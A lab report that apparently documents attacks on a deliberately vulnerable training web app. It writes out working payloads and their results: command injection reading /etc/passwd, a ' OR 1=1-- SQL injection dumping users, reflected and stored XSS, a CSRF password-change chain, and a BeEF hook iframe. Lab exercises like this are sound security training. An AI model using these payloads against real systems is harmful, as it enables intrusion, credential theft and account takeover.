# Web Application Security Testing Lab Report

_made in Obsidian.md_

If you have a Markdown reader, I strongly suggest you use it to view this for vastly increased readibility. Enjoy! :)

## Command Injection Testing

### 1. Basic Command Injection

I tested for command injection vulnerability using command chaining:

```
ls | cat /etc/passwd
```

This payload successfully executed and revealed the contents of the `/etc/passwd` file, confirming a command injection vulnerability. The output included all system users, including:

- `root:x:0:0:root:/root:/bin/bash`
- `msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash`
- `user:x:1001:1001:just a user,111,,:/home/user:/bin/bash`
- `service:x:1002:1002:,,,:/home/service:/bin/bash`
- Various system accounts

### 2. Difficulty Level Testing

I tested the same payload on medium difficulty setting:

```
ls | cat /etc/passwd
```

The command injection vulnerability was still present at medium difficulty, returning identical results to the previous test. This indicates insufficient input validation across difficulty levels.

## SQL Injection Testing

### 3. Authentication Bypass

I used the following SQL injection payload to bypass authentication controls:

```
' OR 1=1-- 
```

The payload successfully executed and dumped the entire user table contents:

| ID         | First Name | Surname |
| ---------- | ---------- | ------- |
| admin      | admin      | admin   |
| ' OR 1=1-- | Gordon     | Brown   |
| ' OR 1=1-- | Hack       | Me      |
| ' OR 1=1-- | Pablo      | Picasso |
| ' OR 1=1-- | Bob        | Smith   |

**Note**: I ensured there was a space after the comment characters (`--`) to make the payload work correctly.

## Cross-Site Scripting (XSS) Testing

### 4. Reflected XSS

I tested for reflected XSS vulnerability with a basic JavaScript alert:

```
<script>alert("Vulnerable!")</script>
```

This payload successfully executed when submitted, triggering a popup window with the text "Vulnerable!" - confirming the application is vulnerable to reflected XSS attacks.

## Combined Attack Testing

### 5. Stored XSS + CSRF Combined Attack

I performed a multi-stage attack combining stored XSS and CSRF:

1. First, I examined the page source code to identify form field names:
    
    - `password_new`
    - `password_conf`
    - `Change` (submit button)
2. Constructed a CSRF payload to change the admin password:
    
    ```
    http://10.10.0.20/dvwa/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change#
    ```
    
3. Combined with an HTML image tag to create a stored XSS payload:
    
    ```
    <img src="http://10.10.0.20/dvwa/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change#">
    ```
    
4. To bypass character limitations, I used browser developer tools to change the message field's maximum length from 50 to 200 characters.
    
5. Verified the attack success by logging out and successfully logging back in with the new password "abc123".
    

### 6. Browser Exploitation Framework (BeEF) Hook

I tested for the ability to inject a BeEF hook via XSS:

```
<iframe src="http://127.0.0.1:3000/demos/basic.html"></iframe>
```

This payload successfully injected a BeEF hook, allowing for client-side exploitation through the BeEF framework.